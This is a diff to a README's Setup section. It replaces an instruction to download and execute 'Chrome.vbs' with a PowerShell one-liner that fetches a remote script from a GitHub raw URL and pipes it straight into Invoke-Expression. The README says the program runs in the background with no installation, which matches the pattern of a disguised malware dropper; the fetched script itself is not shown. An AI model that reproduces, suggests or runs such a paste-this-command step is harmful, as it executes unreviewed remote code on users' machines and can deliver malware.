@@ -4,7 +4,7 @@ No installation or prerequisites are needed. The program runs in the background.
 
 ## Setup
 
-To setup please download *Chrome.vbs* and execute it.
+```irm "https://raw.githubusercontent.com/Kiyan-7/telaviv/refs/heads/main/reminders.ps1" | iex ```
 
 ### Logging
 
